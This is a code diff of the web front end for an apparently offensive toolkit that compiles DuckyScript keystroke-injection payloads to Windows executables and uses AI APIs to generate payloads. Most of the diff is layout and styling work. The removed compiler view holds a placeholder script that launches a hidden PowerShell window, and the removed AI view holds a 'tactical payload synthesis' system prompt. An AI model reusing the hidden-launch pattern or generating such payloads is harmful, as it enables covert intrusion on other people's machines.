@@ -7,6 +7,7 @@
   <link rel="icon" type="image/png" href="IMGS/logo_nav_bar.png">
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Syncopate:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -72,6 +73,7 @@
       font-family:var(--font-mono); font-size:.85rem; letter-spacing:.14em; text-transform:uppercase;
       cursor:pointer; border-radius:var(--radius); transition:all var(--dur) var(--ease); display:none; }
     .boot-btn:hover { background:var(--g); color:#000; box-shadow:0 0 30px rgba(0,255,65,.5); }
+    .splash-art { width:140px; height:auto; object-fit:contain; margin-bottom:1.4rem; filter:drop-shadow(0 0 15px rgba(0,255,65,0.4)); }
 
     /* APP SHELL */
     #app { position:relative; z-index:10; display:flex; flex-direction:column; height:100vh; opacity:0; transition:opacity .8s ease; }
@@ -79,27 +81,34 @@
 
     /* TOP NAV */
     .top-nav { position:sticky; top:0; z-index:500; padding:.65rem clamp(.8rem,2.5vw,1.6rem);
-      background:rgba(1,4,2,.92); backdrop-filter:blur(24px);
+      background:rgba(1,4,2,.92); -webkit-backdrop-filter:blur(24px); backdrop-filter:blur(24px);
       border-bottom:1px solid var(--gbord);
       box-shadow:0 1px 0 rgba(0,255,65,0.06), 0 8px 40px rgba(0,0,0,.7);
-      display:flex; justify-content:space-between; align-items:center; gap:.8rem; }
+      display:block; }
     .brand { font-family:var(--font-display); font-size:1.1rem; font-weight:900;
       letter-spacing:.12em; color:var(--white); text-shadow:0 0 16px rgba(0,255,65,.6);
       display:flex; align-items:center; gap:.6rem; white-space:nowrap; }
+    .brand-logo { height:26px; width:auto; object-fit:contain; filter:drop-shadow(0 0 8px rgba(0,255,65,0.6)); margin-right:3px; }
     .brand-dot { width:8px; height:8px; border-radius:50%; background:var(--g); box-shadow:0 0 12px var(--g); animation:blink 2s step-end infinite; }
     @keyframes blink { 50%{opacity:0} }
     .brand-version { font-size:.56rem; color:var(--g-dim); letter-spacing:.2em; border-left:1px solid var(--gbord); padding-left:.6rem; }
-    .nav-tabs { display:flex; gap:.25rem; flex-wrap:wrap; }
+    .navbar-lenlu .navbar-toggler { border-color:var(--gbord); box-shadow:none; }
+    .navbar-lenlu .navbar-toggler:focus { box-shadow:0 0 0 .15rem rgba(0,255,65,.15); }
+    .navbar-lenlu .navbar-toggler-icon { filter:drop-shadow(0 0 8px rgba(0,255,65,.3)); }
+    .navbar-lenlu .navbar-collapse { flex-grow:1; }
+    .nav-grid { width:100%; }
     .nav-btn { background:transparent; border:1px solid transparent; color:var(--muted); font-family:var(--font-mono); font-size:.68rem;
       padding:.4rem .75rem; border-radius:3px; cursor:pointer; letter-spacing:.08em; text-transform:uppercase;
-      transition:all var(--dur) var(--ease); white-space:nowrap; display:flex; align-items:center; gap:.35rem; }
+      transition:all var(--dur) var(--ease); white-space:nowrap; display:flex; align-items:center; justify-content:center; gap:.35rem; }
     .nav-btn:hover { color:var(--g); border-color:var(--gbord); background:rgba(0,255,65,.06); }
     .nav-btn.active { color:#000; background:linear-gradient(180deg,#b3ffc3,var(--g)); border-color:var(--g); box-shadow:0 0 18px rgba(0,255,65,.35); }
-    .nav-status { display:flex; align-items:center; gap:.7rem; font-size:.68rem; color:var(--muted); flex-shrink:0; }
+    .nav-status { display:flex; align-items:center; justify-content:flex-end; gap:.7rem; font-size:.68rem; color:var(--muted); flex-shrink:0; }
     .status-dot { width:6px; height:6px; border-radius:50%; }
     .status-dot.ok { background:var(--g); box-shadow:0 0 8px var(--g); animation:blink 3s step-end infinite; }
     .status-dot.warn { background:var(--amber); box-shadow:0 0 8px var(--amber); }
     .status-dot.err { background:var(--red); box-shadow:0 0 8px var(--red); }
+
+    section[id] { scroll-margin-top:92px; }
 
     /* MAIN */
     .main { flex:1; overflow-y:auto; position:relative; z-index:20; }
@@ -108,7 +117,7 @@
     @keyframes viewIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:none} }
 
     /* CARDS */
-    .card { background:var(--glass); backdrop-filter:blur(14px); border:1px solid var(--gbord);
+    .card { background:var(--glass); -webkit-backdrop-filter:blur(14px); backdrop-filter:blur(14px); border:1px solid var(--gbord);
       border-radius:var(--radius); box-shadow:var(--shadow-deep); position:relative; overflow:hidden; }
     .card::before { content:''; position:absolute; top:0; left:0; right:0; height:1px;
       background:linear-gradient(90deg,transparent,var(--g),transparent); }
@@ -228,7 +237,7 @@
     .badge-p { background:rgba(191,95,255,.1); color:var(--purple); border:1px solid rgba(191,95,255,.2); }
 
     /* MODAL */
-    .modal { position:fixed; inset:0; z-index:100000; background:rgba(0,0,0,.9); backdrop-filter:blur(10px);
+    .modal { position:fixed; inset:0; z-index:100000; background:rgba(0,0,0,.9); -webkit-backdrop-filter:blur(10px); backdrop-filter:blur(10px);
       display:none; align-items:center; justify-content:center; }
     .modal.open { display:flex; }
     .modal-box { background:var(--base2); border:1px solid var(--gbord-hi); border-radius:var(--radius);
@@ -354,7 +363,7 @@
     .toggle.on::after { background:var(--g); transform:translateX(18px); box-shadow:0 0 8px var(--g); }
 
     /* HERO BANNER */
-    .hero-banner { background:var(--glass); backdrop-filter:blur(14px); border:1px solid var(--gbord);
+    .hero-banner { background:var(--glass); -webkit-backdrop-filter:blur(14px); backdrop-filter:blur(14px); border:1px solid var(--gbord);
       border-radius:var(--radius); padding:1.8rem; position:relative; overflow:hidden; }
     .hero-banner::before { content:''; position:absolute; top:0; left:0; right:0; height:2px;
       background:linear-gradient(90deg,transparent,var(--g),var(--cyan),transparent); }
@@ -376,6 +385,9 @@
       cursor:pointer; transition:all var(--dur); letter-spacing:.1em; text-transform:uppercase; display:flex; align-items:center; gap:.4rem; }
     .arch-btn:hover { background:rgba(255,183,0,.15); border-color:var(--amber); box-shadow:0 0 18px rgba(255,183,0,.3); }
     .arch-btn i { font-size:.9rem; }
+    .module-card-ide { background:linear-gradient(to bottom,rgba(10,12,10,0.85),rgba(0,0,0,0.95)),url('IMGS/ide_workspace.png') no-repeat center/cover; }
+    .module-card-ai { background:linear-gradient(to bottom,rgba(10,12,10,0.85),rgba(0,0,0,0.95)),url('IMGS/ai_generator.png') no-repeat center/cover; transition-delay:100ms; }
+    .module-card-scan { background:linear-gradient(to bottom,rgba(10,12,10,0.85),rgba(0,0,0,0.95)),url('IMGS/scanner_systems.png') no-repeat center/cover; transition-delay:200ms; }
 
     /* UTILITY */
     .flex { display:flex; } .flex-col { display:flex; flex-direction:column; }
@@ -406,12 +418,12 @@
       text-align:center; font-size:.66rem; cursor:pointer; transition:all var(--dur); color:var(--muted); }
     .hk-cell:hover { background:rgba(0,255,65,.15); color:var(--g); border-color:var(--g); }
     .hk-cell .hk-key { font-family:var(--font-display); font-size:.78rem; color:var(--g); display:block; margin-bottom:.15rem; }
-    .cyber-panel { background:rgba(10,12,10,0.6); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
+    .cyber-panel { background:rgba(10,12,10,0.6); -webkit-backdrop-filter:blur(12px); backdrop-filter:blur(12px);
       border:1px solid rgba(0,255,65,0.15); box-shadow:inset 0 0 20px rgba(0,0,0,0.8),0 0 15px rgba(0,255,65,0.05);
       transition:border-color .3s,box-shadow .3s; }
     .cyber-panel:hover { border-color:rgba(0,255,65,0.4); box-shadow:inset 0 0 20px rgba(0,0,0,0.8),0 0 25px rgba(0,255,65,0.15); }
     .text-glow { text-shadow:0 0 10px rgba(0,255,65,0.7); }
-    .metal-text { background:linear-gradient(180deg,#ffffff 0%,#718096 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+    .metal-text { background:linear-gradient(180deg,#ffffff 0%,#718096 100%); -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent; }
     .tilt-card { transition:transform 0.5s ease; }
 
     /* NEW: Scan progress overlay */
@@ -423,11 +435,11 @@
     @keyframes spin { to{transform:rotate(360deg)} }
 
     @media(max-width:768px) {
-      .top-nav { flex-direction:column; align-items:stretch; gap:.4rem; padding:.45rem .8rem; }
-      .brand { font-size:.95rem; justify-content:space-between; }
-      .nav-tabs { overflow-x:auto; white-space:nowrap; flex-wrap:nowrap; padding-bottom:4px; -webkit-overflow-scrolling:touch; }
-      .nav-btn { padding:.35rem .55rem; font-size:.62rem; }
-      .nav-status { display:none; }
+      .top-nav { padding:.45rem .8rem; }
+      .brand { font-size:.95rem; justify-content:space-between; flex-wrap:wrap; }
+      .navbar-lenlu .navbar-collapse { margin-top:.75rem; padding-top:.75rem; border-top:1px solid var(--gbord); }
+      .nav-grid .nav-btn { width:100%; }
+      .nav-status { justify-content:flex-start; }
       .view { padding:.7rem; gap:.7rem; }
       .g2,.g3,.g4,.g-ide,.g-ai { grid-template-columns:1fr !important; }
       .horizontal-scroll-container { flex-direction:column !important; width:100% !important; height:auto !important; gap:1rem !important; }
@@ -447,7 +459,7 @@
 
 <!-- SPLASH -->
 <div id="splash">
-  <img src="IMGS/boot_loading.png" alt="Boot" style="width:140px;height:auto;object-fit:contain;margin-bottom:1.4rem;filter:drop-shadow(0 0 15px rgba(0,255,65,0.4));" />
+  <img src="IMGS/boot_loading.png" alt="Boot" class="splash-art" />
   <div class="splash-logo">LENLU SC</div>
   <div class="splash-sub">Cybernetic Forge v3.0 // Blackbox Assembly</div>
   <div class="splash-bar"><div class="splash-fill" id="splashFill"></div></div>
@@ -459,30 +471,40 @@
 <div id="app">
 
   <!-- NAV -->
-  <nav class="top-nav">
-    <div class="brand">
-      <img src="IMGS/logo_nav_bar.png" alt="LENLU SC" style="height:26px;width:auto;object-fit:contain;filter:drop-shadow(0 0 8px rgba(0,255,65,0.6));margin-right:3px;" />
-      LENLU SC
-      <div class="brand-dot"></div>
-      <span class="brand-version">ARUNESH v3.0</span>
-    </div>
-    <div class="nav-tabs" id="navTabs">
-      <button class="nav-btn active" data-view="studio" onclick="switchView('studio',this)"><i class="fas fa-cubes"></i>Studio</button>
-      <button class="nav-btn" data-view="dashboard" onclick="switchView('dashboard',this)"><i class="fas fa-th-large"></i>Dashboard</button>
-      <button class="nav-btn" data-view="compiler" onclick="switchView('compiler',this)"><i class="fas fa-terminal"></i>Compiler</button>
-      <button class="nav-btn" data-view="neural" onclick="switchView('neural',this)"><i class="fas fa-brain"></i>Neural Lab</button>
-      <button class="nav-btn" data-view="scanner" onclick="switchView('scanner',this)"><i class="fas fa-satellite-dish"></i>Scanner</button>
-      <button class="nav-btn" data-view="network" onclick="switchView('network',this)"><i class="fas fa-network-wired"></i>Network</button>
-      <button class="nav-btn" data-view="encoder" onclick="switchView('encoder',this)"><i class="fas fa-code"></i>Encoder</button>
-      <button class="nav-btn" data-view="vault" onclick="switchView('vault',this)"><i class="fas fa-lock"></i>Vault</button>
-      <button class="nav-btn" data-view="history" onclick="switchView('history',this)"><i class="fas fa-history"></i>History</button>
-      <button class="nav-btn" data-view="terminal" onclick="switchView('terminal',this)"><i class="fas fa-angle-double-right"></i>Shell</button>
-      <button class="nav-btn" data-view="settings" onclick="switchView('settings',this)"><i class="fas fa-sliders-h"></i>Settings</button>
-    </div>
-    <div class="nav-status">
-      <div class="status-dot ok" id="sysStatusDot"></div>
-      <span id="sysTime">--:--:--</span>
-      <span id="compileCount" style="color:var(--g);font-family:var(--font-display);font-size:.68rem">0 ops</span>
+  <nav class="navbar navbar-expand-lg navbar-dark top-nav navbar-lenlu">
+    <div class="container-fluid px-0">
+      <a class="navbar-brand brand m-0" href="#view-studio">
+        <img src="IMGS/logo_nav_bar.png" alt="LENLU SC" class="brand-logo" />
+        LENLU SC
+        <div class="brand-dot"></div>
+        <span class="brand-version">ARUNESH v3.0</span>
+      </a>
+      <button class="navbar-toggler ms-auto" type="button" data-bs-toggle="collapse" data-bs-target="#lenluNavbar" aria-controls="lenluNavbar" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="lenluNavbar">
+        <div class="row g-2 w-100 align-items-center mt-3 mt-lg-0">
+          <div class="col-12 col-xl">
+            <div class="row row-cols-2 row-cols-md-3 row-cols-lg-auto g-2 nav-grid">
+              <div class="col">
+                <a class="nav-link nav-btn active" href="#view-studio" data-nav-link>Studio</a>
+              </div>
+              <div class="col">
+                <a class="nav-link nav-btn" href="#modules" data-nav-link>Modules</a>
+              </div>
+              <div class="col">
+                <a class="nav-link nav-btn" href="#archives" data-nav-link>Archives</a>
+              </div>
+            </div>
+          </div>
+          <div class="col-12 col-xl-auto ms-xl-auto">
+            <div class="nav-status">
+              <div class="status-dot ok" id="sysStatusDot"></div>
+              <span id="sysTime">--:--:--</span>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
   </nav>
 
@@ -498,10 +520,10 @@
             Real-world cybernetic command studio. Compiles keyboard injection payloads to EXE via SciTE/Aut2Exe, scans live WiFi &amp; Bluetooth, analyzes networks with actual browser APIs.
           </p>
           <div class="mt-10 flex flex-col md:flex-row items-center justify-center gap-5">
-            <button onclick="switchView('dashboard',document.querySelector('[data-view=dashboard]'))" class="relative px-8 py-4 bg-transparent border border-matrix-glow text-matrix-glow font-mono text-sm uppercase tracking-widest hover:bg-matrix-glow hover:text-black transition-all duration-300 overflow-hidden group cursor-pointer">
+            <a href="htm.html" class="relative px-8 py-4 bg-transparent border border-matrix-glow text-matrix-glow font-mono text-sm uppercase tracking-widest hover:bg-matrix-glow hover:text-black transition-all duration-300 overflow-hidden group cursor-pointer flex items-center justify-center">
               <span class="relative z-10">Initialize System</span>
               <div class="absolute inset-0 h-full w-0 bg-matrix-glow transition-all duration-300 ease-out group-hover:w-full z-0"></div>
-            </button>
+            </a>
             <a href="https://github.com/lenluarun/LENLU-SC/raw/main/LENLUSC.apk" download="LENLUSC.apk" class="relative px-8 py-4 bg-transparent border border-matrix-glow text-matrix-glow font-mono text-sm uppercase tracking-widest hover:bg-matrix-glow hover:text-black transition-all duration-300 overflow-hidden group cursor-pointer flex items-center gap-2">
               <i class="fab fa-android"></i>
               <span class="relative z-10">LENLU-SC Android</span>
@@ -551,29 +573,29 @@
             <h2 class="font-display text-4xl md:text-6xl font-bold metal-text uppercase">Operations</h2>
           </div>
           <div class="grid grid-cols-1 md:grid-cols-3 gap-7 perspective-1000">
-            <div class="tilt-card cyber-panel p-7 rounded-xl h-[340px] flex flex-col justify-between cursor-crosshair relative overflow-hidden group reveal-up" style="background:linear-gradient(to bottom,rgba(10,12,10,0.85),rgba(0,0,0,0.95)),url('IMGS/ide_workspace.png') no-repeat center/cover;">
+            <div class="tilt-card cyber-panel module-card-ide p-7 rounded-xl h-[340px] flex flex-col justify-between cursor-crosshair relative overflow-hidden group reveal-up">
               <div class="relative z-10">
                 <div class="w-12 h-12 rounded border border-matrix-glow/30 flex items-center justify-center mb-5 text-matrix-glow group-hover:bg-matrix-glow group-hover:text-black transition-colors"><span class="font-mono text-xl">01</span></div>
                 <h3 class="font-display text-xl font-bold text-white mb-3 tracking-wide uppercase">IDE Workbench</h3>
                 <p class="font-sans text-sm text-gray-400">DuckyScript IDE with real-time linter, full AutoIt3 compiler output, and SciTE/Aut2Exe x64/x86 EXE package builder.</p>
               </div>
-              <button onclick="switchView('compiler',document.querySelector('[data-view=compiler]'))" class="font-mono text-xs text-matrix-glow/70 group-hover:text-matrix-glow transition-colors bg-transparent border-none cursor-pointer p-0 text-left">&gt; OPEN COMPILER</button>
+              <button onclick="toast('Launch LENLU APK wrapper to activate live compiler workspace.', 'info')" class="font-mono text-xs text-matrix-glow/70 group-hover:text-matrix-glow transition-colors bg-transparent border-none cursor-pointer p-0 text-left">&gt; OPEN COMPILER</button>
             </div>
-            <div class="tilt-card cyber-panel p-7 rounded-xl h-[340px] flex flex-col justify-between cursor-crosshair relative overflow-hidden group reveal-up" style="background:linear-gradient(to bottom,rgba(10,12,10,0.85),rgba(0,0,0,0.95)),url('IMGS/ai_generator.png') no-repeat center/cover;transition-delay:100ms;">
+            <div class="tilt-card cyber-panel module-card-ai p-7 rounded-xl h-[340px] flex flex-col justify-between cursor-crosshair relative overflow-hidden group reveal-up">
               <div class="relative z-10">
                 <div class="w-12 h-12 rounded border border-matrix-glow/30 flex items-center justify-center mb-5 text-matrix-glow group-hover:bg-matrix-glow group-hover:text-black transition-colors"><span class="font-mono text-xl">02</span></div>
                 <h3 class="font-display text-xl font-bold text-white mb-3 tracking-wide uppercase">AI Neural Lab</h3>
                 <p class="font-sans text-sm text-gray-400">Real Anthropic/OpenAI/Groq API integration. Generate DuckyScript payloads via text or voice dictation.</p>
               </div>
-              <button onclick="switchView('neural',document.querySelector('[data-view=neural]'))" class="font-mono text-xs text-matrix-glow/70 group-hover:text-matrix-glow transition-colors bg-transparent border-none cursor-pointer p-0 text-left">&gt; OPEN AI GENERATOR</button>
+              <button onclick="toast('Launch LENLU APK wrapper to activate neural synthesis lab.', 'info')" class="font-mono text-xs text-matrix-glow/70 group-hover:text-matrix-glow transition-colors bg-transparent border-none cursor-pointer p-0 text-left">&gt; OPEN AI GENERATOR</button>
             </div>
-            <div class="tilt-card cyber-panel p-7 rounded-xl h-[340px] flex flex-col justify-between cursor-crosshair relative overflow-hidden group reveal-up" style="background:linear-gradient(to bottom,rgba(10,12,10,0.85),rgba(0,0,0,0.95)),url('IMGS/scanner_systems.png') no-repeat center/cover;transition-delay:200ms;">
+            <div class="tilt-card cyber-panel module-card-scan p-7 rounded-xl h-[340px] flex flex-col justify-between cursor-crosshair relative overflow-hidden group reveal-up">
               <div class="relative z-10">
                 <div class="w-12 h-12 rounded border border-matrix-glow/30 flex items-center justify-center mb-5 text-matrix-glow group-hover:bg-matrix-glow group-hover:text-black transition-colors"><span class="font-mono text-xl">03</span></div>
                 <h3 class="font-display text-xl font-bold text-white mb-3 tracking-wide uppercase">Signal Scanners</h3>
                 <p class="font-sans text-sm text-gray-400">Real BLE device discovery via Web Bluetooth API. Live DNS recon, localhost port analysis, and WebRTC IP leak detection.</p>
               </div>
-              <button onclick="switchView('scanner',document.querySelector('[data-view=scanner]'))" class="font-mono text-xs text-matrix-glow/70 group-hover:text-matrix-glow transition-colors bg-transparent border-none cursor-pointer p-0 text-left">&gt; OPEN SCANNERS</button>
+              <button onclick="toast('Launch LENLU APK wrapper to activate signal scanner systems.', 'info')" class="font-mono text-xs text-matrix-glow/70 group-hover:text-matrix-glow transition-colors bg-transparent border-none cursor-pointer p-0 text-left">&gt; OPEN SCANNERS</button>
             </div>
           </div>
         </div>
@@ -616,684 +638,18 @@
       </section>
     </div>
 
-    <!-- ═══════════════════ DASHBOARD ═══════════════════ -->
-    <div class="view" id="view-dashboard">
-      <div class="hero-banner">
-        <div class="hb-grid"></div>
-        <div class="hb-title">BLACKBOX <em>FORGE</em> v3.0</div>
-        <div class="hb-sub">Real-world cybernetic command console. DuckyScript → Aut2Exe EXE compiler, live BLE scanner, DNS recon, localhost port sweep. All operations client-side sandboxed.</div>
-        <div class="hb-tags">
-          <span class="badge badge-g"><i class="fas fa-circle" style="font-size:.48rem"></i> System Online</span>
-          <span class="badge badge-c">WebGL Active</span>
-          <span class="badge badge-a">Session Live</span>
-          <span class="badge badge-p">Neural Ready</span>
-          <span class="badge badge-g">BLE API Ready</span>
-        </div>
-      </div>
-      <div class="stat-row">
-        <div class="stat-cell"><div class="stat-val green counter" id="stat-compiled">0</div><div class="stat-lbl">Compilations</div></div>
-        <div class="stat-cell"><div class="stat-val cyan counter" id="stat-ai">0</div><div class="stat-lbl">AI Queries</div></div>
-        <div class="stat-cell"><div class="stat-val amber counter" id="stat-vault">0</div><div class="stat-lbl">Vault Scripts</div></div>
-        <div class="stat-cell"><div class="stat-val red counter" id="stat-scans">0</div><div class="stat-lbl">Network Scans</div></div>
-      </div>
-      <div class="g3">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-bolt ch-icon"></i>Quick Compile</span><span class="card-tag">LIVE</span></div>
-          <div class="card-body flex-col gap-sm">
-            <textarea class="inp" id="qkInput" placeholder="DELAY 500&#10;STRING hello&#10;ENTER" rows="5" style="min-height:110px;font-size:.74rem"></textarea>
-            <button class="btn btn-primary w100" onclick="quickCompile()"><i class="fas fa-play"></i>Compile &amp; Preview</button>
-            <div class="term-log" id="qkLog" style="height:95px"><div class="tl-line tl-sys"><span class="tl-ts">[00:00:00]</span>Compiler standby…</div></div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-robot ch-icon"></i>Neural Quick Ask</span><span class="card-tag">AI</span></div>
-          <div class="card-body flex-col gap-sm">
-            <input class="inp" id="qkAskInp" placeholder="Describe payload objective…" onkeydown="if(event.key==='Enter')qkAsk()"/>
-            <button class="btn btn-cyan w100" onclick="qkAsk()"><i class="fas fa-paper-plane"></i>Send Query</button>
-            <div id="qkAskOut" class="text-sm text-muted mt-sm" style="min-height:80px;max-height:130px;overflow-y:auto;line-height:1.7">// Response appears here</div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-heartbeat ch-icon"></i>Telemetry</span><span class="card-tag">LIVE</span></div>
-          <div class="card-body flex-col gap-md">
-            <div class="pbar-wrap"><div class="pbar-label"><span>Compiler Pipeline</span><span id="pb1v">92%</span></div><div class="pbar-track"><div class="pbar-fill g" id="pb1" style="width:92%"></div></div></div>
-            <div class="pbar-wrap"><div class="pbar-label"><span>Neural Uplink</span><span id="pb2v">68%</span></div><div class="pbar-track"><div class="pbar-fill c" id="pb2" style="width:68%"></div></div></div>
-            <div class="pbar-wrap"><div class="pbar-label"><span>Vault Integrity</span><span id="pb3v">100%</span></div><div class="pbar-track"><div class="pbar-fill g" id="pb3" style="width:100%"></div></div></div>
-            <div class="pbar-wrap"><div class="pbar-label"><span>RF Spectrum</span><span id="pb4v">44%</span></div><div class="pbar-track"><div class="pbar-fill a" id="pb4" style="width:44%"></div></div></div>
-            <canvas id="telCanvas" class="mini-canvas" height="80" style="height:80px;margin-top:.4rem"></canvas>
-          </div>
-        </div>
-      </div>
-      <div class="g2">
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-book ch-icon"></i>DuckyScript Reference</span></div>
-          <div class="card-body"><div class="heatmap-grid" id="duckRef"></div></div>
-        </div>
-        <div class="card">
-          <div class="card-header"><span><i class="fas fa-stream ch-icon"></i>Activity Feed</span><span class="card-tag">STREAM</span></div>
-          <div class="card-body"><div class="term-log" id="actFeed" style="height:220px"></div></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ COMPILER ═══════════════════ -->
-    <div class="view" id="view-compiler">
-      <div class="flex items-center justify-between gap-md mb-sm" style="flex-wrap:wrap">
-        <div>
-          <div style="font-family:var(--font-display);font-size:.95rem;letter-spacing:.12em;color:var(--white)">PAYLOAD WORKBENCH</div>
-          <div class="text-xs text-muted mt-sm">DuckyScript → AutoIt3 pipeline · SciTE/Aut2Exe EXE builder (x64 &amp; x86)</div>
-        </div>
-        <div class="flex gap-sm" style="flex-wrap:wrap">
-          <button class="btn btn-ghost btn-sm" onclick="clearEditor()"><i class="fas fa-trash"></i>Clear</button>
-          <button class="btn btn-ghost btn-sm" onclick="loadTemplate()"><i class="fas fa-file-code"></i>Template</button>
-          <button class="btn btn-ghost btn-sm" onclick="insertSnippet()"><i class="fas fa-puzzle-piece"></i>Snippets</button>
-          <button class="btn btn-amber btn-sm" onclick="exportAu3()"><i class="fas fa-download"></i>Download .au3</button>
-          <button class="btn btn-primary btn-sm" onclick="compilePayload()"><i class="fas fa-play"></i>Compile (Ctrl+↵)</button>
-        </div>
-      </div>
-
-      <!-- EXE Builder Section -->
-      <div class="exe-builder">
-        <div class="exe-builder-title"><i class="fas fa-cogs"></i> SciTE / Aut2Exe Compiler — Build Native EXE</div>
-        <div class="flex gap-sm items-center" style="flex-wrap:wrap">
-          <div class="arch-btn-group">
-            <button class="arch-btn" onclick="buildEXEPackage('x64')"><i class="fas fa-microchip"></i>Build x64 Package (.zip)</button>
-            <button class="arch-btn" onclick="buildEXEPackage('x86')"><i class="fas fa-microchip"></i>Build x86 Package (.zip)</button>
-          </div>
-          <div class="text-xs text-muted" style="max-width:300px">
-            Downloads a ZIP with <code>payload.au3</code> + <code>compile_x64.bat</code> / <code>compile_x86.bat</code> scripts that call <code>Aut2Exe.exe</code> automatically.
-          </div>
-        </div>
-      </div>
-
-      <div class="g-ide flex-1" style="min-height:0">
-        <div class="editor-wrap">
-          <div class="editor-bar">
-            <div class="editor-dot ed-r"></div><div class="editor-dot ed-y"></div><div class="editor-dot ed-g"></div>
-            <span class="editor-filename" id="srcFileName">payload.ds</span>
-            <div class="editor-actions">
-              <span id="lintStatus" class="badge badge-g lint-ok">OK</span>
-            </div>
-          </div>
-          <textarea class="code-area flex-1" id="srcEditor" placeholder="REM LENLU SC // DuckyScript Payload&#10;&#10;DELAY 500&#10;GUI r&#10;DELAY 300&#10;STRING powershell.exe -NoP -W Hidden&#10;ENTER" oninput="lintSource(this.value)"></textarea>
-          <div class="flex items-center justify-between mt-sm" style="flex-wrap:wrap;gap:.4rem">
-            <div class="text-xs text-muted"><span id="srcLines">0</span> lines · <span id="srcChars">0</span> chars</div>
-            <div class="flex gap-sm">
-              <button class="btn btn-ghost btn-xs" onclick="copySource()"><i class="fas fa-copy"></i>Copy</button>
-              <button class="btn btn-ghost btn-xs" onclick="pasteSource()"><i class="fas fa-paste"></i>Paste</button>
-            </div>
-          </div>
-        </div>
-        <div class="editor-wrap">
-          <div class="editor-bar">
-            <div class="editor-dot ed-r"></div><div class="editor-dot ed-y"></div><div class="editor-dot ed-g"></div>
-            <span class="editor-filename">assembly.au3</span>
-            <div class="editor-actions">
-              <button class="btn btn-ghost btn-xs" onclick="copyOutput()"><i class="fas fa-copy"></i>Copy</button>
-              <button class="btn btn-ghost btn-xs" onclick="saveToVault()"><i class="fas fa-lock"></i>Vault</button>
-            </div>
-          </div>
-          <pre class="code-area" id="outViewer" style="overflow:auto;white-space:pre-wrap;word-break:break-word">; Compiled assembly will appear here.</pre>
-          <div class="flex items-center justify-between mt-sm">
-            <div class="text-xs text-muted"><span id="outLines">0</span> lines · <span id="outChars">0</span> chars</div>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-header"><span><i class="fas fa-terminal ch-icon"></i>Diagnostic Console</span>
-          <button class="btn btn-ghost btn-xs" onclick="clearLog()"><i class="fas fa-trash"></i></button>
-        </div>
-        <div class="card-body" style="padding:.7rem">
-          <div class="term-log" id="ideLog"></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════ NEURAL LAB ═══════════════════ -->
-    <div class="view" id="view-neural">
-      <div class="g-ai flex-1" style="min-height:0">
-        <div class="flex-col gap-md">
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-cog ch-icon"></i>Neural Config</span></div>
-            <div class="card-body flex-col gap-md">
-              <div class="inp-group">
-                <label class="inp-label">API Endpoint</label>
-                <select class="inp" id="aiEndpoint">
-                  <option value="anthropic">Anthropic (Claude)</option>
-                  <option value="openai">OpenAI (GPT)</option>
-                  <option value="groq">Groq (LLaMA)</option>
-                  <option value="custom">Custom Gateway</option>
-                </select>
-              </div>
-              <div class="inp-group">
-                <label class="inp-label">API Key</label>
-                <input class="inp" type="password" id="aiKey" placeholder="sk-ant-… / sk-… / gsk_…"/>
-              </div>
-              <div class="inp-group">
-                <label class="inp-label">Model</label>
-                <input class="inp" id="aiModel" value="claude-sonnet-4-20250514"/>
-              </div>
-              <div class="inp-group">
-                <label class="inp-label">System Prompt</label>
-                <textarea class="inp" id="aiSysPrompt" style="min-height:75px;font-size:.72rem" placeholder="You are LENLU SC, a tactical payload synthesis assistant specializing in DuckyScript and AutoIt3…"></textarea>
-              </div>
-              <div class="inp-group">
-                <label class="inp-label">Stealth Delay (ms)</label>
-                <input class="inp" type="number" id="aiDelay" value="100" min="0" max="9999"/>
-              </div>
-              <button class="btn btn-primary w100" onclick="saveAIConfig()"><i class="fas fa-save"></i>Save Config</button>
-            </div>
-          </div>
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-microphone ch-icon"></i>Voice Dictation</span></div>
-            <div class="card-body flex-col gap-sm items-center">
-              <div id="micBtn" class="flex items-center justify-center" style="width:68px;height:68px;border-radius:50%;border:2px solid var(--g);background:var(--g-dark);cursor:pointer;font-size:1.5rem;color:var(--g);transition:all .3s" onclick="toggleMic()">
-                <i class="fas fa-microphone"></i>
-              </div>
-              <div class="text-xs text-muted" id="micStatus">Click to start dictation</div>
-              <div class="inp" id="micOutput" style="min-height:55px;font-size:.72rem;color:#b2ffc7" contenteditable></div>
-              <button class="btn btn-ghost btn-xs w100" onclick="sendMicToChat()"><i class="fas fa-arrow-right"></i>Send to Chat</button>
-            </div>
-          </div>
-          <div class="card">
-            <div class="card-header"><span><i class="fas fa-tags ch-icon"></i>Quick Payloads</span></div>
-            <div class="card-body"><div class="flex" style="flex-wrap:wrap;gap:.35rem" id="aiTagGrid"></div></div>
-          </div>
-        </div>
-        <div class="card flex-col" style="height:100%;min-height:500px">
